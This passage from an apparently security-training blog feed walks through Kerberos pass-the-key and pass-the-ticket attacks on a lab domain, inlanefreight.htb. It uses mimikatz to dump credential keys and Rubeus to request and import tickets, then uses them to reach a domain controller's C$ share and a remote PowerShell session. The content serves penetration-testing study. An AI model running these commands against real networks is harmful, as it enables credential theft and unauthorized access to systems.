+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">         * Username : plaintext</span><br><span class="line">         * Domain   : inlanefreight.htb</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60</span><br><span class="line">           rc4_hmac_nt       <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old      <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_md4           <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Forge-a-TGT-Ticket"><a href="#Forge-a-TGT-Ticket" class="headerlink" title="Forge a TGT Ticket"></a>Forge a TGT Ticket</h2><p><code>➜ Note: Modern Windows domains use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an &quot;encryption downgrade.&quot;</code></p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><code>➜ Requires administrative access.</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
+<h3 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h3><p><code>➜ Administrative access not required.</code></p>
+<p>We have four hash types that can be used:</p>
+<ul>
+<li>&#x2F;rc4</li>
+<li>&#x2F;aes128</li>
+<li>&#x2F;aes256</li>
+<li>&#x2F;des</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA &lt; SNIP &gt; wZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIsGa3JidGd0GwdodGIuY29t</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Pass-the-Ticket-PtT-To-The-current-Session"><a href="#Pass-the-Ticket-PtT-To-The-current-Session" class="headerlink" title="Pass the Ticket (PtT) To The current Session"></a>Pass the Ticket (PtT) To The current Session</h1><h2 id="Loading-a-TGT-Directly-Into-the-Current-Logon-Session"><a href="#Loading-a-TGT-Directly-Into-the-Current-Logon-Session" class="headerlink" title="Loading a TGT Directly Into the Current Logon Session"></a>Loading a TGT Directly Into the Current Logon Session</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f /ptt</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
+
+<h2 id="Importing-a-kirbi-Ticket"><a href="#Importing-a-kirbi-Ticket" class="headerlink" title="Importing a .kirbi Ticket"></a>Importing a .kirbi Ticket</h2><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:[<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"></span><br><span class="line">[+] ticket successfully imported!</span><br></pre></td></tr></table></figure>
+<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Then we can access shares using the created the imported ticket.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> \\DC01.inlanefreight.htb\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files (x86)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Pass-The-Ticket-with-PowerShell-Remoting-winrm"><a href="#Pass-The-Ticket-with-PowerShell-Remoting-winrm" class="headerlink" title="Pass The Ticket with PowerShell Remoting (winrm)"></a>Pass The Ticket with PowerShell Remoting (winrm)</h1><h2 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h4 id="Import-Ticket"><a href="#Import-Ticket" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Connect-winrm"><a href="#Connect-winrm" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h2><h4 id="Create-a-sacrificial-process"><a href="#Create-a-sacrificial-process" class="headerlink" title="Create a sacrificial process"></a>Create a sacrificial process</h4><p><code>➜ The command will open a new cmd window</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe createnetonly /program:<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /show</span><br></pre></td></tr></table></figure>
+<h4 id="Import-Ticket-1"><a href="#Import-Ticket-1" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><p><code>➜ From that window, we can execute Rubeus to request a new TGT.</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<span class="number">9279</span>bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Connect-winrm-1"><a href="#Connect-winrm-1" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
